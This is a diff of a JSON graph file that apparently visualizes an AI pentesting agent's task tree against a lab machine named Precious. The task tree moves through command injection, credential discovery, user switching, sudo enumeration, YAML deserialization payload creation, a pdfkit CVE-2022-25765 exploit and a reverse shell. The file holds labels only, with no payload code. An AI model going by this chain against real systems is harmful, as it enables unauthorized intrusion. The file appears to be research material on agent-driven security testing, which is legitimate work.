+      "id": "agent:precious:r1_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
       "type": "Agent",
       "color": "#3A86FF",
-      "title": "Cumulative PTT after 7:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u2713 5 Lateral movement\n  \u2713 5.1 Switch user to henry\n\u2713 6 Root privilege escalation\n  \u2713 6.1 Sudo enumeration\n\u25cb 7 YAML deserialization\n  \u25cb 7.1 Malicious payload creation",
-      "size": 40,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "search:Precious:r1_s6_7.1",
-      "label": "Search: 7.1\nMalicious payload creation",
-      "type": "Search",
-      "color": "#FB5607",
-      "title": "PTT item 7.1: Malicious payload creation\n\nMCP tool calls:\nInteractive CLI: Run sudo -l to enumerate sudo privileges for henry user",
-      "size": 40,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "track:Precious:r1_s6_7.1",
-      "label": "Track: Malicious payload creation",
-      "type": "Track",
-      "color": "#06D6A0",
-      "title": "7.1 Malicious payload creation:\n(status change only)",
-      "size": 34,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "agent:Precious:r1_s6_7.1",
-      "label": "Agent: 7.1\nYAML deserialization",
-      "type": "Agent",
-      "color": "#3A86FF",
-      "title": "Cumulative PTT after 7.1:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u2713 5 Lateral movement\n  \u2713 5.1 Switch user to henry\n\u2713 6 Root privilege escalation\n  \u2713 6.1 Sudo enumeration\n\u25cb 7 YAML deserialization\n  \u25cb 7.1 Malicious payload creation",
-      "size": 40,
-      "shape": "dot",
-      "borderColor": "#212529",
-      "borderWidth": 3,
-      "font": {
-        "color": "#212529"
-      }
-    },
-    {
-      "id": "agent:Precious:r1_close",
-      "label": "Agent: Task\nComplete (Goal)",
-      "type": "Agent",
-      "color": "#FF006E",
-      "title": "Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Network enumeration\n  \u2713 1.2 Subdomain enumeration\n\u2713 2 Web application analysis\n  \u2713 2.1 Application fingerprinting\n\u2713 3 Vulnerability exploitation\n  \u2713 3.1 Command injection testing\n\u2713 4 Privilege escalation to henry\n  \u2713 4.1 Credential discovery\n\u2713 5 Lateral movement\n  \u2713 5.1 Switch user to henry\n\u2713 6 Root privilege escalation\n  \u2713 6.1 Sudo enumeration\n\u2713 7 YAML deserialization\n  \u2713 7.1 Malicious payload creation",
+      "title": "Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n  \u2713 1.5 Enumerate HTTP service\n  \u2713 1.6 Enumerate the website\n  \u2713 1.7 Intercept and analyze the request and response\n  \u2713 1.8 Explore the suspicious files and create a summary of the findings\n  \u2713 1.9 Vulnerability Assessment on pdfkit v0.8.6\n  \u2713 1.10 Exploit the CVE-2022-25765 vulnerability\n  \u2713 1.11 Obtain a reverse shell",
       "size": 46,
       "shape": "dot",
       "borderColor": "#212529",
@@ -556,9 +472,9 @@
   ],
   "edges": [
     {
-      "from": "agent:Precious:START",
-      "to": "agent:Precious:r1_s1_2",
-      "label": "\u2192 2",
+      "from": "agent:precious:START",
+      "to": "agent:precious:r1_base",
+      "label": "baseline",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -568,9 +484,9 @@
       }
     },
     {
-      "from": "agent:Precious:START",
-      "to": "search:Precious:r1_s1_2",
-      "label": "2 Web application ana\u2026",
+      "from": "agent:precious:START",
+      "to": "search:precious:r1_base",
+      "label": "Baseline Recon",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -580,8 +496,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s1_2",
-      "to": "track:Precious:r1_s1_2",
+      "from": "search:precious:r1_base",
+      "to": "track:precious:r1_base",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -592,8 +508,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s1_2",
-      "to": "agent:Precious:r1_s1_2",
+      "from": "track:precious:r1_base",
+      "to": "agent:precious:r1_base",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -604,9 +520,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s1_2",
-      "to": "agent:Precious:r1_s1_2.1",
-      "label": "\u2192 2.1",
+      "from": "agent:precious:r1_base",
+      "to": "agent:precious:r1_s1_1.5",
+      "label": "\u2192 1.5",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -616,9 +532,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s1_2",
-      "to": "search:Precious:r1_s1_2.1",
-      "label": "2.1 Application fingerp\u2026",
+      "from": "agent:precious:r1_base",
+      "to": "search:precious:r1_s1_1.5",
+      "label": "1.5 Enumerate HTTP serv\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -628,8 +544,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s1_2.1",
-      "to": "track:Precious:r1_s1_2.1",
+      "from": "search:precious:r1_s1_1.5",
+      "to": "track:precious:r1_s1_1.5",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -640,8 +556,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s1_2.1",
-      "to": "agent:Precious:r1_s1_2.1",
+      "from": "track:precious:r1_s1_1.5",
+      "to": "agent:precious:r1_s1_1.5",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -652,9 +568,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s1_2.1",
-      "to": "agent:Precious:r1_s2_3",
-      "label": "\u2192 3",
+      "from": "agent:precious:r1_s1_1.5",
+      "to": "agent:precious:r1_s2_1.6",
+      "label": "\u2192 1.6",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -664,9 +580,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s1_2.1",
-      "to": "search:Precious:r1_s2_3",
-      "label": "3 Vulnerability explo\u2026",
+      "from": "agent:precious:r1_s1_1.5",
+      "to": "search:precious:r1_s2_1.6",
+      "label": "1.6 Enumerate the websi\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -676,8 +592,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s2_3",
-      "to": "track:Precious:r1_s2_3",
+      "from": "search:precious:r1_s2_1.6",
+      "to": "track:precious:r1_s2_1.6",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -688,8 +604,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s2_3",
-      "to": "agent:Precious:r1_s2_3",
+      "from": "track:precious:r1_s2_1.6",
+      "to": "agent:precious:r1_s2_1.6",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -700,9 +616,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s2_3",
-      "to": "agent:Precious:r1_s2_3.1",
-      "label": "\u2192 3.1",
+      "from": "agent:precious:r1_s2_1.6",
+      "to": "agent:precious:r1_s3_1.7",
+      "label": "\u2192 1.7",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -712,9 +628,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s2_3",
-      "to": "search:Precious:r1_s2_3.1",
-      "label": "3.1 Command injection t\u2026",
+      "from": "agent:precious:r1_s2_1.6",
+      "to": "search:precious:r1_s3_1.7",
+      "label": "1.7 Intercept and analy\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -724,8 +640,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s2_3.1",
-      "to": "track:Precious:r1_s2_3.1",
+      "from": "search:precious:r1_s3_1.7",
+      "to": "track:precious:r1_s3_1.7",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -736,8 +652,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s2_3.1",
-      "to": "agent:Precious:r1_s2_3.1",
+      "from": "track:precious:r1_s3_1.7",
+      "to": "agent:precious:r1_s3_1.7",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -748,9 +664,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s2_3.1",
-      "to": "agent:Precious:r1_s3_4",
-      "label": "\u2192 4",
+      "from": "agent:precious:r1_s3_1.7",
+      "to": "agent:precious:r1_s4_1.8",
+      "label": "\u2192 1.8",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -760,9 +676,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s2_3.1",
-      "to": "search:Precious:r1_s3_4",
-      "label": "4 Privilege escalatio\u2026",
+      "from": "agent:precious:r1_s3_1.7",
+      "to": "search:precious:r1_s4_1.8",
+      "label": "1.8 Explore the suspici\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -772,8 +688,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s3_4",
-      "to": "track:Precious:r1_s3_4",
+      "from": "search:precious:r1_s4_1.8",
+      "to": "track:precious:r1_s4_1.8",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -784,8 +700,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s3_4",
-      "to": "agent:Precious:r1_s3_4",
+      "from": "track:precious:r1_s4_1.8",
+      "to": "agent:precious:r1_s4_1.8",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -796,9 +712,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s3_4",
-      "to": "agent:Precious:r1_s3_4.1",
-      "label": "\u2192 4.1",
+      "from": "agent:precious:r1_s4_1.8",
+      "to": "agent:precious:r1_s5_1.9",
+      "label": "\u2192 1.9",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -808,9 +724,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s3_4",
-      "to": "search:Precious:r1_s3_4.1",
-      "label": "4.1 Credential discovery",
+      "from": "agent:precious:r1_s4_1.8",
+      "to": "search:precious:r1_s5_1.9",
+      "label": "1.9 Vulnerability Asses\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -820,8 +736,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s3_4.1",
-      "to": "track:Precious:r1_s3_4.1",
+      "from": "search:precious:r1_s5_1.9",
+      "to": "track:precious:r1_s5_1.9",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -832,8 +748,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s3_4.1",
-      "to": "agent:Precious:r1_s3_4.1",
+      "from": "track:precious:r1_s5_1.9",
+      "to": "agent:precious:r1_s5_1.9",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -844,9 +760,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s3_4.1",
-      "to": "agent:Precious:r1_s4_5",
-      "label": "\u2192 5",
+      "from": "agent:precious:r1_s5_1.9",
+      "to": "agent:precious:r1_s6_1.10",
+      "label": "\u2192 1.10",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -856,9 +772,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s3_4.1",
-      "to": "search:Precious:r1_s4_5",
-      "label": "5 Lateral movement",
+      "from": "agent:precious:r1_s5_1.9",
+      "to": "search:precious:r1_s6_1.10",
+      "label": "1.10 Exploit the CVE-202\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -868,8 +784,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s4_5",
-      "to": "track:Precious:r1_s4_5",
+      "from": "search:precious:r1_s6_1.10",
+      "to": "track:precious:r1_s6_1.10",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -880,8 +796,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s4_5",
-      "to": "agent:Precious:r1_s4_5",
+      "from": "track:precious:r1_s6_1.10",
+      "to": "agent:precious:r1_s6_1.10",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -892,9 +808,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s4_5",
-      "to": "agent:Precious:r1_s4_5.1",
-      "label": "\u2192 5.1",
+      "from": "agent:precious:r1_s6_1.10",
+      "to": "agent:precious:r1_s7_1.11",
+      "label": "\u2192 1.11",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -904,9 +820,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s4_5",
-      "to": "search:Precious:r1_s4_5.1",
-      "label": "5.1 Switch user to henry",
+      "from": "agent:precious:r1_s6_1.10",
+      "to": "search:precious:r1_s7_1.11",
+      "label": "1.11 Obtain a reverse sh\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -916,8 +832,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s4_5.1",
-      "to": "track:Precious:r1_s4_5.1",
+      "from": "search:precious:r1_s7_1.11",
+      "to": "track:precious:r1_s7_1.11",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -928,8 +844,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s4_5.1",
-      "to": "agent:Precious:r1_s4_5.1",
+      "from": "track:precious:r1_s7_1.11",
+      "to": "agent:precious:r1_s7_1.11",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -940,9 +856,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s4_5.1",
-      "to": "agent:Precious:r1_s5_6",
-      "label": "\u2192 6",
+      "from": "agent:precious:r1_s7_1.11",
+      "to": "agent:precious:r1_s8_1.12",
+      "label": "\u2192 1.12",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -952,9 +868,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s4_5.1",
-      "to": "search:Precious:r1_s5_6",
-      "label": "6 Root privilege esca\u2026",
+      "from": "agent:precious:r1_s7_1.11",
+      "to": "search:precious:r1_s8_1.12",
+      "label": "1.12 Enumerate the machi\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -964,8 +880,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s5_6",
-      "to": "track:Precious:r1_s5_6",
+      "from": "search:precious:r1_s8_1.12",
+      "to": "track:precious:r1_s8_1.12",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -976,8 +892,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s5_6",
-      "to": "agent:Precious:r1_s5_6",
+      "from": "track:precious:r1_s8_1.12",
+      "to": "agent:precious:r1_s8_1.12",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -988,9 +904,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s5_6",
-      "to": "agent:Precious:r1_s5_6.1",
-      "label": "\u2192 6.1",
+      "from": "agent:precious:r1_s8_1.12",
+      "to": "agent:precious:r1_s9_1.13",
+      "label": "\u2192 1.13",
       "type": "StateTransition",
       "color": "#000000",
       "width": 4,
@@ -1000,9 +916,9 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s5_6",
-      "to": "search:Precious:r1_s5_6.1",
-      "label": "6.1 Sudo enumeration",
+      "from": "agent:precious:r1_s8_1.12",
+      "to": "search:precious:r1_s9_1.13",
+      "label": "1.13 Switch user to 'hen\u2026",
       "type": "SearchUpdate",
       "color": "#06D6A0",
       "width": 3,
@@ -1012,8 +928,8 @@
       }
     },
     {
-      "from": "search:Precious:r1_s5_6.1",
-      "to": "track:Precious:r1_s5_6.1",
+      "from": "search:precious:r1_s9_1.13",
+      "to": "track:precious:r1_s9_1.13",
       "label": "Discover",
       "type": "TrackUpdate",
       "color": "#3A86FF",
@@ -1024,8 +940,8 @@
       }
     },
     {
-      "from": "track:Precious:r1_s5_6.1",
-      "to": "agent:Precious:r1_s5_6.1",
+      "from": "track:precious:r1_s9_1.13",
+      "to": "agent:precious:r1_s9_1.13",
       "label": "Leads to",
       "type": "Prediction",
       "color": "#8338EC",
@@ -1036,104 +952,8 @@
       }
     },
     {
-      "from": "agent:Precious:r1_s5_6.1",
-      "to": "agent:Precious:r1_s6_7",
-      "label": "\u2192 7",
-      "type": "StateTransition",
-      "color": "#000000",
-      "width": 4,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "agent:Precious:r1_s5_6.1",
-      "to": "search:Precious:r1_s6_7",
-      "label": "7 YAML deserialization",
-      "type": "SearchUpdate",
-      "color": "#06D6A0",
-      "width": 3,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "search:Precious:r1_s6_7",
-      "to": "track:Precious:r1_s6_7",
-      "label": "Discover",
-      "type": "TrackUpdate",
-      "color": "#3A86FF",
-      "width": 3,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "track:Precious:r1_s6_7",
-      "to": "agent:Precious:r1_s6_7",
-      "label": "Leads to",
-      "type": "Prediction",
-      "color": "#8338EC",
-      "width": 2,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "agent:Precious:r1_s6_7",
-      "to": "agent:Precious:r1_s6_7.1",
-      "label": "\u2192 7.1",
-      "type": "StateTransition",
-      "color": "#000000",
-      "width": 4,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "agent:Precious:r1_s6_7",
-      "to": "search:Precious:r1_s6_7.1",
-      "label": "7.1 Malicious payload c\u2026",
-      "type": "SearchUpdate",
-      "color": "#06D6A0",
-      "width": 3,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "search:Precious:r1_s6_7.1",
-      "to": "track:Precious:r1_s6_7.1",
-      "label": "Discover",
-      "type": "TrackUpdate",
-      "color": "#3A86FF",
-      "width": 3,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "track:Precious:r1_s6_7.1",
-      "to": "agent:Precious:r1_s6_7.1",
-      "label": "Leads to",
-      "type": "Prediction",
-      "color": "#8338EC",
-      "width": 2,
-      "arrows": "to",
-      "smooth": {
-        "type": "continuous"
-      }
-    },
-    {
-      "from": "agent:Precious:r1_s6_7.1",
-      "to": "agent:Precious:r1_close",
+      "from": "agent:precious:r1_s9_1.13",
+      "to": "agent:precious:r1_close",
       "label": "close",
       "type": "StateTransition",
       "color": "#000000",
@@ -1145,12 +965,12 @@
     }
   ],
   "graph_statistics": {
-    "total_nodes": 38,
-    "total_edges": 49,
-    "agent_nodes": 14,
-    "search_nodes": 12,
-    "track_nodes": 12,
+    "total_nodes": 32,
+    "total_edges": 41,
+    "agent_nodes": 12,
+    "search_nodes": 10,
+    "track_nodes": 10,
     "runs_detected": 1,
-    "rows_captured": 8
+    "rows_captured": 13
   }
 }
